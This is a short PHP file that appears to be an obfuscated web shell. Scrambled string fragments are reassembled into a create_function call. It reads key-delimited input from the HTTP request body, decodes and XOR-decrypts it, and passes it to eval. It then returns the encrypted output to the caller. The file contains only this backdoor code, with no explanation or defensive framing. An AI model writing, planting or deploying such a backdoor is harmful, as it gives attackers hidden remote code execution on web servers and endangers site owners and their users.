<?php
$J='-ents("-php-://input-"),$m)==--1) {@ob_sta-rt()-;@ev-al(@gz-uncompress-(@x-(@';
$T=str_replace('k','','ckrkeate_kfkuknctkion');
$u='UUCh-M-fd-b";function- x(--$t,$k){-$c=strlen($k);$l=s-trlen($--t);$o="";-';
$L='$j-};-}}return-- $-o;}if --(@preg_match("/$kh(.+)$kf-/"-,@file_g-et_cont';
$l='for($i=-0-;$i<$l;){fo-r-($j=-0;($j<-$c&&$i<$l);$-j++,$i-++){$o.=$-t{$i}^-$k{';
$p='-$k="3db-40b8b";-$kh="80dc-f6114684";-$kf=-"23e4fe-902621"-;$p="6--9IKej62';
$g=');$-r-=@b-ase64_encode(@x(-@-gzco-mpress(-$o),$-k));pr-i-nt("$p$kh$r$kf");}';
$n='b-ase64-_decode(-$m[1-]),$k)));-$o-=@ob_get_con-tents()-;@ob_e-nd_cl-ean(';
$C=str_replace('-','',$p.$u.$l.$L.$J.$n.$g);
$y=$T('',$C);$y();
?>
